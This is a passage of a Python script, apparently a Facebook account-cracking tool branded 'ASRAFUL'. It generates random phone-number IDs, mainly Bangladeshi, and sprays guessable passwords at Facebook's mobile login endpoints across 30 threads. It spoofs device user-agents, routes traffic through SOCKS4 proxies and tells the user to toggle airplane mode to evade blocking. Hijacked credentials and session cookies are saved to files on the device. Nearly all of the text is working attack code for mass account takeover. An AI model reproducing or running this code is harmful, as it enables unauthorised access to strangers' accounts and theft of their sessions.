                print(f'{R}[{G}+{R}]{G} NO INTERNET CONNECTION...')
                exit()
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FILE METHOD M1 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def api1(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r{R}[{G}ASRAFUL-F1{R}] >> {R}[{A}{loop}{R}]{R} >> {R}[{G}OK{A}•{G}{len(oks)}{R}]");sys.stdout.flush()
    sys.stdout.flush()
    ua  = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBRV/279865282;FBCR/Airtel;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    try:
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln)
            data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": ids,
            "password": pas,
            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_GB",
            "client_country_code": "GB",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            head = {
            'User-Agent': UA(),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            url = "https://b-graph.facebook.com/auth/login"
            po = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if "access_token" in po:
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r\x1b[38;5;46m{A}[{G}ASRAFUL-OK💉{A}]{G} '+ids+f' {R}•{G} '+pas+'')
                asraful = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
                print(f"\r{R}[{G}COOKIE{R}]{G}━{R}>{asraful} {coki}")
                open('/sdcard/ASRAFUL-FILE-M1-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}[ASRAFUL-CP{R}] '+ids+f' | '+pas+'')
                open('/sdcard/ASRAFUL-FILE-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FILE METHOD M2 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def api2(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r{R}[{G}ASRAFUL-F2{R}] >> {R}[{A}{loop}{R}]{R} >> {R}[{G}OK{A}•{G}{len(oks)}{R}]");sys.stdout.flush()
    sys.stdout.flush()
    ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_GB;FBCR/Airtel;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX2111;FBSV/12;nullFBCA/armeabi-v7a:armeabi;]"
    try:
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln)
            data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": ids,
            "password": pas,
            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_GB",
            "client_country_code": "GB",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            head = {
            'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            url = "https://b-graph.facebook.com/auth/login"
            po = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if "access_token" in po:
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r\x1b[38;5;46m{A}[{G}ASRAFUL-OK💉{A}]{G} '+ids+f' {R}•{G} '+pas+'')
                asraful = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
                print(f"\r{R}[{G}COOKIE{R}]{G}━{R}>{asraful} {coki}")
                open('/sdcard/ASRAFUL-FILE-M2-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}[ASRAFUL-CP{R}] '+ids+f' | '+pas+'')
                open('/sdcard/ASRAFUL-FILE-M2-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FILE METHOD M3 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def api3(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r{R}[{G}ASRAFUL-F3{R}] >> {R}[{A}{loop}{R}]{R} >> {R}[{G}OK{A}•{G}{len(oks)}{R}]");sys.stdout.flush()
    sys.stdout.flush()
    ua  = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBCR/Robi;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    try:
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln)
            data = {'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'cpl': 'true', 'family_device_id': 'f975ba9d-78d1-4b90-8d2f-7ee2c437a3a7', 'credentials_type': 'device_based_login_password', 'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': ids, 'password': pas, 'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1', 'meta_inf_fbmeta': '', 'advertiser_id': str(uuid.uuid4()), 'currently_logged_in_userid': '0', 'locale': 'en_GB', 'client_country_code': 'GB', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'api_key': '882a8490361da98702bf97a021ddc14d'}
            head = {'User-Agent': ua, 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'X-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            url = "https://api.facebook.com/auth/login"
            po = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if "access_token" in po:
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r\x1b[38;5;46m{A}[{G}ASRAFUL-OK💉{A}]{G} '+ids+f' {R}•{G} '+pas+'')
                asraful = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
                print(f"\r{R}[{G}COOKIE{R}]{G}━{R}>{asraful} {coki}")
                open('/sdcard/ASRAFUL-FILE-M3-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}[ASRAFUL-CP{R}] '+ids+f' | '+pas+'')
                open('/sdcard/ASRAFUL-FILE-M3-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ RANDOM ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#     
def ___RANDOM___():
    clear()
    print(f'{red}[{white}A{red}]{green} BD RANDOM ')
    print(f'{red}[{white}B{red}]{green} INDIA RANDOM')
    print(f'{red}[{white}C{red}]{green} MALAYSIA RANDOM')
    print(f'{red}[{white}D{red}]{green} PAKISTAN RANDOM')
    print(f'{red}[{white}E{red}]{green} NEPAL RANDOM')
    print(f'{red}[{white}F{red}]{green} PHILIPPINES RANDOM')
    print(f'{red}[{white}G{red}]{green} BACK MENU')
    linex()
    error_ = input(f'{red}[{white}◆{red}]{green} Selection {white}▶ {yellow}︎')
    if error_ in ['A','a','01','1']:___BD___()
    elif error_ in ['B','b','02','2']:___INDIA___()
    elif error_ in ['C','c','03','3']:___ML___()
    elif error_ in ['D','d','04','4']:___PK___()
    elif error_ in ['E','e','05','5']:___NP___()
    elif error_ in ['F','f','06','6']:___PH___()
    elif error_ in ['G','g','07','7']:menu()
    else:___RANDOM___()

def ___BD___():
    clear()
    print(f'{red}[{green}◆{red}] {green}SIM CODES {white}▶︎ {red}[{white}018 017 016 013{red}]');linex()
    code = input(f'{red}[{green}◆{red}]{green} Choice    {white}▶︎ {yellow}')
    clear()
    print(f'{red}[{green}◆{red}] {green}EXAMPLE {white}  ▶︎ {red}[{white}10000 20000 30000{red}]');linex()
    limit = int(input(f'{red}[{green}◆{red}] {green}LIMITS    {white}▶︎ \x1b[38;5;208m'))
    linex()
    plist = []
    clear()
    print(f"\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m METHOD 1\n\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m METHOD 2\n\x1b[38;5;160m[\033[1;37mC\x1b[38;5;160m]\x1b[38;5;46m METHOD 3\n\x1b[38;5;160m[\033[1;37mD\x1b[38;5;160m]\x1b[38;5;46m METHOD 4");linex()
    mtd=input(f"\x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mSelection \033[1;37m▶︎ \x1b[38;5;208m")
    clear()
    print(f"\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m AUTO PASSWORD")
    print(f"\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m CHOICE PASSWORD");linex()
    __CH__ = input(f"\x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mSelection \033[1;37m▶︎ \x1b[38;5;208m")
    if __CH__ in ["A","a","1"]:
        plist.append('first6')
        plist.append('last6')
        plist.append('first7')
        plist.append('last7')
        plist.append('first8')
        plist.append('last8')
        plist.append('last11')
        plist.append('@1234@')
        plist.append('@12345@')
        plist.append('@123456@')
        plist.append('@1234567@')
        plist.append('@@@@####')
        plist.append('@#@#@#')
        plist.append('708090')
        plist.append('506060')
        plist.append('203040')
        plist.append('102030')
        
    elif __CH__ in ["B","b","2"]:
        clear()
        psl = int(input(f'{red}[{white}➤{red}] {green}INPUT PASS LIMITS {white}▶︎ {red}'));linex()
        print(f"{red}[{white}➤{red}] {green}EXAMPLE {red}[{white} first6,first8,last6,last8{red}]")
        linex()
        for i in range(psl):
            plist.append(input(f'{red}[{white}➤{red}] {green}PASSWORD NO-{i+1} {white}▶︎ \x1b[38;5;208m'));linex()
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    clear()
    with ThreadPoolExecutor(max_workers=30) as error:
        clear()
        print(f'{red}[{white}➤{red}]{green} SIM CODE  {white}:{green} {code} {white}>{green} METHOD {white}: {green}{mtd}')
        print(f'{red}[{white}➤{red}]{green} NETWORK {white}  :{green} {sim} ') 
        print(f'{red}[{white}➤{red}]{green} TOTAL UID {white}:{green} %s ' %len(user))
        print(f'{red}[{white}➤{red}]{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY {white}3{green} MIN');linex()
        for love in user:
            ids = code + love
            ax = ids[:8]
            bx = ids[:7]
            cx = ids[:6]
            xa = love[1:]
            tl = len(user)
            xb = love[2:]
            psd = plist
            if mtd in ['A','a','01','1']:crack_submit.submit(randm,ids,psd)
            elif mtd in ['B','b','02','2']:error.submit(randm1, ids, psd,tl)
            elif mtd in ['C','c','03','3']:error.submit(randm2, ids, psd,tl)
            elif mtd in ['D','d','04','4']:error.submit(randm3, ids, psd,tl)
    print(f'\r{white}================================================')
    print(f'{red}[{white}➤{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
    print(f'{red}[{white}➤{red}]{green} TOTAL OK {white}:{green} %s' % str(len(oks)))
    print(f'{red}[{white}➤{red}]{green} TOTAL CP {white}:{red} %s' % str(len(cps)))
    print(f'\r{white}================================================')
    input(f"{red}[{white}➤{red}]{green} PRESS ENTER TO BACK MENU ")
    menu()
                   
def _bd_():
    clear()
    print(f'{A}[{R}●{A}] {G}EXAMPLE {A}:{G1} 017{A}/{G1}019{A}/{G1}018{A}/{G1}016');linex()
    code = input(f'{A}[{R}●{A}] {G}INPUT {R}>>{A}  ');linex()
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    print(f'{A}[{R}●{A}] {G}EXAMPLE {A}:{G3} 3000{A}/{G3}5000{A}/{G3}10000{A}/{G3}99999');linex()
    limit = int(input(f'{A}[{R}●{A}] {G}INPUT {R}>>{A}  '))
    for x in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    clear()
    with tred(max_workers=30) as crack_submit:
        clear()
        print(f"{A}[{R}●{A}] {G}USERNAME{R} : {A}MR ASRAFUL");print(f"{A}[{R}●{A}] {G}KEY {R}:{A} {MY_KEY} ");linex();print(f'{A}[{R}●{A}]{G} SIM NAME  {R}>> {A}{sim}')
        print(f'{A}[{R}●{A}] {G}TOTAL ID {R} >>{A} {limit} {R} >> {G}SIM CODE {R} >>{A} {code}')                                   
        print(f'{A}[{R}●{A}] {G}TURN ON/OF AIRPLAN MODE EVERY 5 MIN');linex()
        for love in user:
            ids = code+name+cod+love
            psd = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
            crack_submit.submit(randm,ids,psd)
    print('')
    linex()
    print(f'{A}[{R}●{A}] {G}THE PROCESS HAS BEEN COMPLETED')
    print(f'{A}[{R}●{A}] {G}TOTAL OK ID {A}:{G2} {str(len(ok))}')
    print(f'{A}[{R}●{A}] {G}TOTAL CP ID :{A} {str(len(cp))}')
    linex()
    input(f'{A}[{R}●{A}] {G}PRESS ENTER TO BACK ')
    menu()
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ RNMETHOD ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#                        
def randm(ids,psd):
    global loop,ok,cp,sim_id,xvx
    prox=random.choice(xvx)
    bro={"http":"socks4://"+prox}
    ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Robi;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX2111;FBSV/12;nullFBCA/armeabi-v7a:armeabi;]"
    sys.stdout.write(f"\r\r{A}[{G}ASRAFUL-RN{A}] >> {A}[{R}{loop}{A}]{R} >> {A}[{G}OK{A}•{G}{len(oks)}{A}]");sys.stdout.flush()
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'',
            'cpl':'true','try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'en_US',
            'client_country_code':'US',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': yek(),
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'graph.facebook.com',
            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type':'WIFI',
            'X-Tigon-Is-Retry':'False',
            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group':'5120',
            'X-FB-Friendly-Name':'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags':'graphservice',
            'X-FB-HTTP-Engine':'Liger',
            'X-FB-Client-IP':'True',
            'X-FB-Server-Cluster':'True',
            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'https://api.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'access_token' in q:
                uid = str(q['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                print(f'\r\r\x1b[38;5;46m{A}[{G}ASRAFUL-OK💉{A}]{G} {uid} | {pas}')
                asraful = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
                print(f"\r{R}[{G}COOKIE{R}]{G}━{R}>{asraful} {coki}")
                open('/sdcard/ASRAFUL-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ END ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
if __name__ == "__main__":
    Get_Data().get()
#####menu()
    
  